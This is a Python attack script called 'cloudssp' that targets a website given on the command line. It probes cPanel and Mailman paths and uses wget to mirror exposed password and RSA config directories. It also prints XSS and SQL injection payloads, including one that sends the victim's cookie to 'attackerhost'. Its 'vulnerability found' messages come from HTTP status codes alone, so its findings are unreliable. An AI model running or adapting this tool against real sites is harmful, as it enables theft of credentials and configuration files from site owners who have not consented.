import sys
import requests 
import os
import colorama

from urllib.parse import urlparse
from colorama import Fore, Back, Style





def check():
    if len(sys.argv) < 2:
       os.system('clear')
       
       print (f"\n\n sorry Please Supply A Website To Test")
       sys.exit()
    else:
         print("") 

check()
    
def banner():
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    
    print(f"""

                        
    
      {r}   ___   __                 _               
      {g}  / __\ / /  ___  _   _  __| |___ ___ _ __  
      {r} / /   / /  / _ \| | | |/ _` / __/ __| '_ \ 
      {g}/ /___/ /__| (_) | |_| | (_| \__ \__ \ |_) |
      {r}\____/\____/\___/ \__,_|\__,_|___/___/ .__/ 
                                          {g}|_|
                                         
                {g}*                       *{r}  
         {r}*                                   {r}*
                   {g}| {w}Made By Nano  {g}|   
           
        """)

            
            
def exploits():
    
    
    r = Fore.RED
    g = Fore.GREEN
    y = Fore.YELLOW
    w = Fore.WHITE
    banner()
    
    url = sys.argv[1]+''
    
    c = requests.get(url+'/cpanel?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if c.status_code == 404:
           print(f'{w}\n{y}[cloudssp] >{w} CPANEL {g}= {r}Not found')
             
    
              
    
    
    
    
    print(f"{w}\n{y}[cloudssp] >{w} Finding Config Dumps...")
    p = requests.get(url+'//idx_config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    if p.status_code == 404:
              
              print(f'{w}\n{y}[cloudssp] > {w}Password Configs {g}= {r}Not found')
              
              
    else:
            print(f"{y}[cloudssp] >{w} {w}Checking for Password Configs...\n")
            print(f"{y}[cloudssp] >{w} {g}Found {w}Password {r}Configs {g}({w}Might be {r}False{g})")
            os.system("wget --execute='robots = off' --mirror --reject='index.html*' --convert-links --no-parent --wait=1 "+sys.argv[1]+"//idx_config/" + ">/dev/null 2>&1")
            print(f"{y}[cloudssp] > {w}File {g}> {r}/idx_config/ ")
    
    
    
    
    
    url = sys.argv[1]+''
    x = requests.get(url+'//.cpanel/caches/config/?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
    
    if x.status_code == 404:
              
              print(f'{y}\n[cloudssp] > {w}RSA Configs {g}= {r}Not found\n')
              
              
    else:
            check()
            
            print(f"{y}[cloudssp] > {w}Finding RSA Configs...\n")
            os.system("wget --execute='robots = off' --cut-dirs=3 --reject='index.html*' --mirror --convert-links --no-parent --wait=1 "+sys.argv[1]+".cpanel/caches/config/" + ">/dev/null 2>&1")
            
            print(f"{y}[cloudssp] > {g}Found {w}CPANEL {r}Configs {g}({w}Might be {r}False{g})")
            print(f"{y}[cloudssp] > {w}File {g}> {r}/.cpanel/caches/config/")
            
            
    xs = requests.get(url+'//mailman/options/yourlist?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
    print(f"{y}[cloudssp] > {w}Finding Vulns...\n")
    if xs.status_code == 404:
              
              
              print(f'{y}[cloudssp] > {w}Vulns {g}= {r}Not found')
              
              
    else:
            print(f"{y}[cloudssp] > {w}Finding Vulns...")
            print(f"\n{y}[cloudssp] > {g}Found XSS {r}{url}{r}/mailman/options/yourlist?language=en&email=<SCRIPT>alert('OOPS')</SCRIPT>")
            
            
    xss = requests.get(url+'//mailman/subscribe/ml-name?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ')
    
    if xss.status_code == 404:
              
              
              u = "l"
              
              
    else:
            print(f"{y}[cloudssp] > {g}Found XSS {r}{url}{r}/mailman/subscribe/ml-name?info=<script>document.location%3D'http://attackerhost/attackerscript.cgi?'%2Bdocument.cookie;</script>")
            
            
            
            
            
    sqlc = {'code': '1111111111111111111111111'}      
    sql = requests.post(url+'//activate.php?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ', data = sqlc)       
    if sql.status_code == 404:
              
              
              lol = ":P:"
              
              
    else:
            print(f"{y}[cloudssp] > {g}Found SQl Injection {r}{url}{r}?code=1111111111111111111111111'+OR+user_id='2")
            
                   
            
    print(f"\n{y}[cloudssp] > {w}Checking For backend...\n")        
            
     


    


def ight():
    
    
    y = Fore.YELLOW
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    url = sys.argv[1]+''
    x = requests.get(url+'//mailman/listinfo/mailman?__cf_chl_jschl_tk__=509e227df9c193cddcf8aacb9ad3b8ba5846ee87-1606707403-0-AYjYbSvApqlrX4yF5_FRe7SbbJRIjE3vryE78mIDz64x7zNQD3eGDAGV2OTBd3JIvIAFTD_6x3vGMvmWKnN4HuM1mIqyruGDN5Fw3PAGRufMeC7Ks1A5QymJNGh0JsDnZkyv5uDzfJLkssQ3PgnZr6GhWE9RPENFIuobcE77Z9yD9LVfqOavT39NlE4X1_J0aJqQuR0TgfPh0k3WI4QaDULadX-QiLNOYavoy7Q_w2oqCyaKzRO7HZuU0qYtBbKCsust9h09l2nOWiqxGUOO9LqV--qaF7gOfpVbfE8hC3J165i00Z2s7gyqJ1EXLztfXQ') 
    
    if x.status_code == 404:
              
              
              
              exploits()
    else:
          
          
          exploits()
          arg = sys.argv[1]+''
          
          rsp=requests.get(arg, stream=True)
          rsp.raw._connection.sock.getpeername()
        
          
          print(f"{y}[cloudssp] > {g}Found {w}CPANEL {r}Backend")
          print(f"{y}[cloudssp] > {w}Url : {w}" + arg)
          print(f"{y}[cloudssp] > {w}Protected :{r}", rsp.raw._connection.sock.getpeername())
         
          print(f"\n{y}[cloudssp] > {w}Backend : " + g)
          os.system(f"curl "+sys.argv[1]+"//mailman/listinfo/mailman -s | grep /mailman/subscribe/mailman | cut -c31-110 | tee backend.txt")
          print("\n")
                
                
          
      


ight()


